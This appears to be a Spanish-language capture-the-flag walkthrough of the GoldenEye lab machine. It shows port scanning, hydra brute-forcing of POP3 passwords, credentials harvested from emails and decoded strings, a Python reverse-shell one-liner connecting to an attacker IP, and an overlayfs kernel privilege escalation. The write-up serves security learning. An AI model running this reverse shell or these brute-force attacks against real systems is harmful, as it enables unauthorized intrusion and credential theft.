<h1 align="center"> GoldenEye </h1>

TEST conectividad

![image](https://github.com/user-attachments/assets/60d91b18-0000-4b62-b1e8-39c4749137db)

Escaner puertos

```
sudo nmap -sCV -T4 --min-rate 4000 -p- ip
```

![image](https://github.com/user-attachments/assets/01336cc0-8e6f-4884-89dd-ef27921b518c)

Nos encontramos con varios puertos que iremos investigando por ahora empezamos con la web puerto 80

Nos encontramos uan web un tanto rara que os manda a otro directorio /sev-home/

Cosa que nosotros primero de todo miraremos el archivo "terminal.js" posteriormente en el código veremos una contraseña codificada y parece ser que el usuario Boris

&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;

![image](https://github.com/user-attachments/assets/66f3e4d3-3f70-42c3-a519-b7c25ea5a80d)

Ahora si que nos podemos ir al logeo y probar con

boris:InvincibleHack3r

Estamos dentro

![image](https://github.com/user-attachments/assets/35f432f2-6c99-45e3-84ad-5dce1b031438)

Dentro de está página nos estan diciendo que igual los servicios de correo deberiamos configurarlos mejor, si nos vamos a los puertos anteriormente vistos vemos el puerto 25 abierto con un smtp

Primero de todo enumeramos con telnet

```
telnet ip puerto
```

Si nos damos cuenta por el puerto 25 realmente no hay nada importante los puertos importantes son el "55006 y 55007"

Si tiramos hydar a estos puertos puede que saquemos credenciales cosa que hemos probado

```
hydra -l boris -P /usr/share/wordlists/rockyou.txt 10.10.14.251 -s 55007 pop3
```
Alfinal lo sacamos "secret1!"

Vemos que nos conectamos por telnet 

![image](https://github.com/user-attachments/assets/ef7018ad-a4f4-407a-aa6e-d80b9745a848)

Vemos que no encontramos cosas importantes pero sabemos otro usuario "natalya"

Si hacemos lo mismo de hydra sacamos la pass "bird"

El segundo email de natalya nos dan unas credenciales bastante imporantes

xenia:RCP90rulez!

Primero de todo hemos encontrado un dominio 10.10.7.77  severnaya-station.com

Vamos a añadirlo a los hosts

```
echo "10.10.7.77  severnaya-station.com" | sudo tee -a /etc/hosts
```
![image](https://github.com/user-attachments/assets/efb424e8-9182-4f1a-804b-46579a0f700b)

![image](https://github.com/user-attachments/assets/d6d30b8c-401d-434a-9a40-6a202315e8f4)

Nos logeamos con el usuario "xenia"

En mensajes vemos algo importante

![image](https://github.com/user-attachments/assets/cab0dddc-c49f-41e0-a9ff-ea78b12425db)

"doak"

Vamos a utilizar hydra

```
 hydra -l doak -P /data/src/wordlists/fasttrack.txt pop3://10.10.7.77:55007
```

doak:goat 

Nos conectamos por nuevo de telnet

![image](https://github.com/user-attachments/assets/6a7eb22f-8297-43ea-b6c5-9d92186aeb15)

Sacamos otras credenciales

dr_doak:4England!

Si nos metemos al perfil vemos una rchivo "s3cret.txt"

![image](https://github.com/user-attachments/assets/46267a64-13e1-49ba-a472-f130488456a4)


Si probamos a descargarlas

```
wget http://ip/dir007key/for-007.jpg
```

![image](https://github.com/user-attachments/assets/577af05a-772f-4763-9b7e-0ae8063a75da)

$ echo "eFdpbnRlcjE5OTV4IQ==" | base64 -d
xWinter1995x!

Tenemos una nueva pass

Hacemos uan rev shell con rlwreap y la subimos a setings path

```
rlwrap nc -nlvp 4444
```

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.0.54",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

![image](https://github.com/user-attachments/assets/137a7cce-7304-4ba5-a090-63e4f23f376a)

```
uname -a
```
para ver el kernel version

Está maquina es vulnerable a exploit overlafs

Creamos un nuevo usaurio usando clone "CLONE_NEWUSER|CLONE_NEWS"

Lo montamos en en /bin, cuando sea bisible cogemos losn ombres y lo cambiamos

hacemos un su

![image](https://github.com/user-attachments/assets/2447a0ed-729c-4ab6-b48c-968bf7ad04eb)


![image](https://github.com/user-attachments/assets/3f32ceb0-23d8-4fa1-a230-fb2b91a245a5)

